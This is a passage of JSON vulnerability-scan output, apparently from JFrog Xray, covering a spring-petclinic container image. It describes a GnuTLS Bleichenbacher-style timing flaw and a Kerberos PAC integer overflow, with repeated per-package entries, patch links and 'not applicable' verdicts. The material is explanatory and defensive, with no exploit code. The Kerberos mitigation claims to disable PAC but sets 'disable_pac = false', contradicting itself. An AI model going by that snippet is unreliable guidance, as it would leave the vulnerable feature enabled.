            "FullDescription": "[GnuTLS](https://gnutls.org/) is a secure communications library implementing the SSL, TLS, and DTLS protocols and technologies around them. It provides a simple C language application programming interface (API) to access the secure communications protocols as well as APIs to parse and write X.509, PKCS #12, and other required structures.\n\nIn GnuTLS, establishing a TLS connection involves exchanging keys beforehand. It was discovered that the response time to this key exchange depends on the size of encrypted data when processing PKCS#1 v1.5 encrypted data. An attacker might be able to perform a timing side-channel attack to extract information about the RSA key by observing the time it takes to perform this operation.\n\nThe specific possible side-channel attack due to this issue is called [Bleichenbacher's Attack](https://medium.com/@c0D3M/bleichenbacher-attack-explained-bc630f88ff25) and requires timing the server responses by sending a large amount of different malformed RSA ciphertext messages.\n\nTo perform this attack, an attacker would need to be on the same machine or subnet where the decryption takes place and to be able to trigger many decryption operations (oracle attack).\n\nA successful attack would compromise the server's private RSA key, allowing the attacker to decrypt any sniffed TLS traffic sent to or from the server from any host.",
            "Impact": 6,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Development mitigations\n\nUse GnuTLS with ECDH key exchange instead of RSA key exchange.\nThis can be done by generating an ECDH key using OpenSSL:\n`openssl ecparam -name prime256v1 -genkey -noout -out mykey-prime256v1.pem`\n\nAnd giving the filepath of the keyfile to the `gnutls_certificate_set_x509_key_file` function -\n```c\ngnutls_certificate_set_x509_key_file(res, certfile, \"mykey-prime256v1.pem\", GNUTLS_X509_FMT_PEM);\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Although Bleichenbacher's Attack is well documented today, a high technical understanding of cryptography is required to exploit it.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "A successful attack would compromise the server's private RSA key, allowing the attacker to decrypt any sniffed TLS traffic sent to or from the server from any host.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to be able to trigger many decryption operations (oracle attack). Also, the attacker needs to be on the same subnet as the decrypting machine.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Fix Commit",
                  "Url": "https://gitlab.com/gnutls/gnutls/-/commit/22e3dc0c415654d0ac2170209e763175c7547069",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official GnuTLS GitLab Issue",
                  "Url": "https://gitlab.com/gnutls/gnutls/-/issues/1050",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
            "cve_id": "CVE-2023-0361",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function `gnutls_init` is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
            "vulnerability_id": "CVE-2023-0361",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-261410",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u3"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-42898",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
               "provider": "JFrog"
            }
         },
         "edited": "2023-02-15T12:36:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-261410",
            "VulnerabilityTitle": "",
            "ShortDescription": "An integer overflow in PAC parser of Kerberos 5 can lead to remote code execution (on 32-bit systems) or denial of service (on all systems) when parsing a crafted Kerberos ticket.",
            "FullDescription": "[MIT Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol that uses secret key cryptography to secure communications over a computer network. \n\n[Privilege Attribute Certificate](https://wiki.samba.org/index.php/Kerberos_PAC) (PAC) is a data structure that is used in the Kerberos network authentication protocol to store authorization data for a user. It is used to determine what resources a user is allowed to access and what actions they are allowed to perform. \n\nA PAC is typically embedded in a ticket that is issued by the Kerberos authentication server and passed to the client system when the user logs in. The client system uses the PAC to determine the user's permissions when the user attempts to access a resource.\n\nThe client system will send the ticket and the PAC to the resource server, which will use the information contained in the PAC to determine whether the user is allowed to access the resource. If the user is authorized, the resource server will grant access to the resource. If the user is not authorized, the resource server will deny access to the resource.\n\nThe Kerberos' PAC parser lacks a size check that prevents an integer overflow. A crafted PAC can either: \n- Cause a smaller-than-needed buffer allocation that will contain the PAC parsed data and can subsequently lead to a heap-buffer overflow which might lead to remote code execution (on 32-bit systems only),\n- Cause a bigger-than-needed buffer allocation which will lead to a read out-of-bounds and possible DoS.\n\nSince the PAC is parsed only after extraction from a decrypted ticket, the attacker needs to produce a ticket that the victim can decrypt. For that reason, among the services using Kerberos protocol, the Key Distribution Center (KDC) is an easy target as any authenticated attacker can print a ticket encrypted with their own long-term key and get the KDC to parse the PAC contained within. \n\n[A patch](https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4) was released for the MIT Kerberos. \nSamba implements their own version of Kerberos library and released a [patch](https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch).\nHeimdal also released a [patch](https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b).\n\nThis issue also impacts [Microsoft's Kerberos in Active Directory](https://www.samba.org/samba/security/CVE-2022-42898.html).",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nPAC can be disabled in KDC configuration file (kdc.conf) for version 1.20+:\n```\n[kdcdefault]\n  disable_pac = false\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attackers must send a Kerberos ticket that the victim can decrypt to get the PAC to be parsed.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "While MIT Kerberos's patch includes 2 PACs causing a DoS, there is no technical discussion or PoC that demonstrates exploiting the heap overflow (on 32-bit systems) for code execution",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Can lead to remote code execution on 32-bit systems",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Heimdal's patch",
                  "Url": "https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Samba's patch",
                  "Url": "https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Samba's advisory for their Kerberos implementation",
                  "Url": "https://www.samba.org/samba/security/CVE-2022-42898.html",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "MIT Kerberos's patch, including PAC causing DoS",
                  "Url": "https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2022-42898",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Did not find a 32-bit Kerberos KDC executable (krb5kdc)",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2022-42898",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-261410",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u3"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-42898",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
               "provider": "JFrog"
            }
         },
         "edited": "2023-02-15T12:36:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-261410",
            "VulnerabilityTitle": "",
            "ShortDescription": "An integer overflow in PAC parser of Kerberos 5 can lead to remote code execution (on 32-bit systems) or denial of service (on all systems) when parsing a crafted Kerberos ticket.",
            "FullDescription": "[MIT Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol that uses secret key cryptography to secure communications over a computer network. \n\n[Privilege Attribute Certificate](https://wiki.samba.org/index.php/Kerberos_PAC) (PAC) is a data structure that is used in the Kerberos network authentication protocol to store authorization data for a user. It is used to determine what resources a user is allowed to access and what actions they are allowed to perform. \n\nA PAC is typically embedded in a ticket that is issued by the Kerberos authentication server and passed to the client system when the user logs in. The client system uses the PAC to determine the user's permissions when the user attempts to access a resource.\n\nThe client system will send the ticket and the PAC to the resource server, which will use the information contained in the PAC to determine whether the user is allowed to access the resource. If the user is authorized, the resource server will grant access to the resource. If the user is not authorized, the resource server will deny access to the resource.\n\nThe Kerberos' PAC parser lacks a size check that prevents an integer overflow. A crafted PAC can either: \n- Cause a smaller-than-needed buffer allocation that will contain the PAC parsed data and can subsequently lead to a heap-buffer overflow which might lead to remote code execution (on 32-bit systems only),\n- Cause a bigger-than-needed buffer allocation which will lead to a read out-of-bounds and possible DoS.\n\nSince the PAC is parsed only after extraction from a decrypted ticket, the attacker needs to produce a ticket that the victim can decrypt. For that reason, among the services using Kerberos protocol, the Key Distribution Center (KDC) is an easy target as any authenticated attacker can print a ticket encrypted with their own long-term key and get the KDC to parse the PAC contained within. \n\n[A patch](https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4) was released for the MIT Kerberos. \nSamba implements their own version of Kerberos library and released a [patch](https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch).\nHeimdal also released a [patch](https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b).\n\nThis issue also impacts [Microsoft's Kerberos in Active Directory](https://www.samba.org/samba/security/CVE-2022-42898.html).",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nPAC can be disabled in KDC configuration file (kdc.conf) for version 1.20+:\n```\n[kdcdefault]\n  disable_pac = false\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attackers must send a Kerberos ticket that the victim can decrypt to get the PAC to be parsed.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "While MIT Kerberos's patch includes 2 PACs causing a DoS, there is no technical discussion or PoC that demonstrates exploiting the heap overflow (on 32-bit systems) for code execution",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Can lead to remote code execution on 32-bit systems",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Heimdal's patch",
                  "Url": "https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Samba's patch",
                  "Url": "https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Samba's advisory for their Kerberos implementation",
                  "Url": "https://www.samba.org/samba/security/CVE-2022-42898.html",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "MIT Kerberos's patch, including PAC causing DoS",
                  "Url": "https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2022-42898",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Did not find a 32-bit Kerberos KDC executable (krb5kdc)",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2022-42898",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-261410",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u3"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-42898",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
               "provider": "JFrog"
            }
         },
         "edited": "2023-02-15T12:36:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-261410",
            "VulnerabilityTitle": "",
            "ShortDescription": "An integer overflow in PAC parser of Kerberos 5 can lead to remote code execution (on 32-bit systems) or denial of service (on all systems) when parsing a crafted Kerberos ticket.",
            "FullDescription": "[MIT Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol that uses secret key cryptography to secure communications over a computer network. \n\n[Privilege Attribute Certificate](https://wiki.samba.org/index.php/Kerberos_PAC) (PAC) is a data structure that is used in the Kerberos network authentication protocol to store authorization data for a user. It is used to determine what resources a user is allowed to access and what actions they are allowed to perform. \n\nA PAC is typically embedded in a ticket that is issued by the Kerberos authentication server and passed to the client system when the user logs in. The client system uses the PAC to determine the user's permissions when the user attempts to access a resource.\n\nThe client system will send the ticket and the PAC to the resource server, which will use the information contained in the PAC to determine whether the user is allowed to access the resource. If the user is authorized, the resource server will grant access to the resource. If the user is not authorized, the resource server will deny access to the resource.\n\nThe Kerberos' PAC parser lacks a size check that prevents an integer overflow. A crafted PAC can either: \n- Cause a smaller-than-needed buffer allocation that will contain the PAC parsed data and can subsequently lead to a heap-buffer overflow which might lead to remote code execution (on 32-bit systems only),\n- Cause a bigger-than-needed buffer allocation which will lead to a read out-of-bounds and possible DoS.\n\nSince the PAC is parsed only after extraction from a decrypted ticket, the attacker needs to produce a ticket that the victim can decrypt. For that reason, among the services using Kerberos protocol, the Key Distribution Center (KDC) is an easy target as any authenticated attacker can print a ticket encrypted with their own long-term key and get the KDC to parse the PAC contained within. \n\n[A patch](https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4) was released for the MIT Kerberos. \nSamba implements their own version of Kerberos library and released a [patch](https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch).\nHeimdal also released a [patch](https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b).\n\nThis issue also impacts [Microsoft's Kerberos in Active Directory](https://www.samba.org/samba/security/CVE-2022-42898.html).",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nPAC can be disabled in KDC configuration file (kdc.conf) for version 1.20+:\n```\n[kdcdefault]\n  disable_pac = false\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attackers must send a Kerberos ticket that the victim can decrypt to get the PAC to be parsed.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "While MIT Kerberos's patch includes 2 PACs causing a DoS, there is no technical discussion or PoC that demonstrates exploiting the heap overflow (on 32-bit systems) for code execution",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Can lead to remote code execution on 32-bit systems",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Heimdal's patch",
                  "Url": "https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Samba's patch",
                  "Url": "https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Samba's advisory for their Kerberos implementation",
                  "Url": "https://www.samba.org/samba/security/CVE-2022-42898.html",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "MIT Kerberos's patch, including PAC causing DoS",
                  "Url": "https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2022-42898",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Did not find a 32-bit Kerberos KDC executable (krb5kdc)",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2022-42898",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-261410",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u3"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-42898",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "PAC parsing in MIT Kerberos 5 (aka krb5) before 1.19.4 and 1.20.x before 1.20.1 has integer overflows that may lead to remote code execution (in KDC, kadmind, or a GSS or Kerberos application server) on 32-bit platforms (which have a resultant heap-based buffer overflow), and cause a denial of service on other platforms. This occurs in krb5_pac_parse in lib/krb5/krb/pac.c. Heimdal before 7.7.1 has \"a similar bug.\"",
               "provider": "JFrog"
            }
         },
         "edited": "2023-02-15T12:36:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-261410",
            "VulnerabilityTitle": "",
            "ShortDescription": "An integer overflow in PAC parser of Kerberos 5 can lead to remote code execution (on 32-bit systems) or denial of service (on all systems) when parsing a crafted Kerberos ticket.",
